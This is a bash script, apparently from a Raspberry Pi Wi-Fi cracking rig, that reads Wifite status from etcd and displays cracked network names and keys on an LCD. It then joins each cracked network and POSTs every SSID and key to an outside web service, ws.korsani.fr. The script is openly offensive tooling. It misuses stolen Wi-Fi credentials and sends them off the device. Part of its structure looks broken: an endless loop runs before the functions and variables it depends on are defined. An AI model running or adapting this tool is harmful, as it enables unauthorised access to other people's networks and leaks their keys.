#!/usr/bin/env bash
# Script to handle infos in etcd, and act accordingly
HERE=$(cd "$(dirname "$0")" ; pwd)
ME=$(basename "$0")
source $HERE/libkoca.sh
source /etc/airberry.conf

koca_lockMe -q /tmp/$ME.lock 2

function check_etcd() {
	/etc/init.d/etcd status >/dev/null 2>&1
}
function display()
{
	where="$1"
	ssid="$2"
	key="$3"
	case $where in
		ws)
			echo -n -e  "\rAuthenticating to $ssid ($bssid)  "
			if connect "$ssid" "$key" "$bssid"
			then
				echo 'ok'
				dhclient -1 $if
				echo -n 'Getting ip  '
				wait_for_ip || continue
				echo 'ok'
				#route add default gw 192.168.0.254
				echo -n "Publication ... expiration is ${WS_EXPIRATION}s"
				curl -X PATCH -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
				curl -X POST  -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
				geoiplookup $(curl -s ws.korsani.fr/myip)
				if [ -n "$UPDATE_ME" ]
				then
					echo 'Updating myself'
					mount /boot
					trap 'umount /boot' 0
					apt-get update > /dev/null
					apt-get -y upgrade > /dev/null
					rpi-update
					#$HOME/bin/wifite.py --update >/dev/null
				fi
				reset_if $if
			else
				echo 'failed'
				echo $bssid >> $connect_fail
			fi


			;;
		lcd)
			$HERE/lcd.py backlight 1
			$HERE/lcd.py text 0 0 $ssid:$key
			;;

	esac
}

koca_lockMe /var/run/$ME.lock

if ! check_etcd
then
	echo 'etcd is not running. Exiting'
	exit 1
fi
while true
do
    status=$(curl -s -L "http://127.0.0.1:$ETCD_PORT/v2/keys/$ETCD_DIR/status" | jq -r -M '.node.value' )
    [ -z "$status" ] && continue
    case $status in
        Wifite:Cracked:*)
            ssid=$(echo $status | cut -d ':' -f 3)
            key=$(curl -s -L "http://127.0.0.1:$ETCD_PORT/v2/keys/cracked/from_reboot/$ssid" | jq -M -r '.node.value')
            display lcd $ssid $key
            echo "$ssid : $key" | wall
            ;;
        Wifite:Attacking:*|Wifite:Start\ cracking:*)
            ssid=$(echo $status | cut -d ':' -f 3)
            $HERE/lcd.py text 0 0 "->$ssid" ; sleep 1
            ivs=$(curl -s -L "http://127.0.0.1:$ETCD_PORT/v2/keys/wifite/status" | jq -M -r '.node.value'| cut -d ':' -f 2)
            $HERE/lcd.py text 0 0 "$ivs" ; sleep 1
            ;;
        *)
            $HERE/lcd.py text 0 0 "$status"
            ;;
    esac
done

t=$(mktemp)
connect_fail=$(mktemp)
if=wlan0
trap "reset_if $if ; rm -f $t $connect_fail" 0
cracked=$HOME/cracked.csv
[ -z "$WS_EXPIRATION" ] && WS_EXPIRATION=36000
function reset_if() {
	echo "Reseting $if"
	local if=$1
	dhclient -r $if
	ifconfig $if 0.0.0.0
	ifconfig $if down
	iwconfig $if mode managed essid '' key off
}
function connect() {
	ifconfig $if up
	ssid="$1"
	key="$2"
	bssid="$3"
	iwconfig $if ap $bssid
	iwconfig $if key $key
	if [ -n $ssid ]
	then
		iwconfig $if essid "$ssid"
	fi
	for i in $(seq 0 10 100)
	do
		#iwconfig $if | grep -q "ESSID:\"$1\"" && return 0
		iw $if link | grep -q "SSID: $1" && return 0
		sleep 1
		koca_spin
	done
	echo
	return 1
}
function wait_for_ip()
{
	for i in $(seq 1 10)
	do
		ifconfig $if | grep -q inet && return 0
		sleep 1
		koca_spin
	done
	echo
	return 1
}
while [ "$1" != "" ]
do
	case $1 in
		-h)
			echo "$(basename "$0") [ -u ] [ -c ] <where>"
			echo " -u		: udpate files when connected"
			echo " -c <file>	: cracked file"
			echo "where : ws or lcd"
			exit 0
			;;
		-u) export UPDATE_ME=yes;;
		-c) export cracked=$2;shift;;
		*) export WHERE=$1;;
	esac
	shift
done
echo "Waiting $cracked"
while [ ! -e $cracked ]
do
	sleep 1
done
reset_if $if
echo -n -e "\r                                                      "
echo -n -e "\rWaiting  "
koca_spin
for line in $(tac $cracked)
do
	bssid=$(echo $line | cut -d ',' -f 1)
	ssid=$(echo $line | cut -d ',' -f 3)
	key=$(echo $line | cut -d ',' -f 4)
	if egrep -q "^$bssid$" $t
	then
		#echo -n "$ssid : connection tested"
		sleep 3 
		continue
	fi
	if egrep -q "^$bssid$" $connect_fail
	then
		#echo -n "$ssid : connection was failed"
		sleep 3
		continue
	fi
	display $WHERE $ssid $key
done
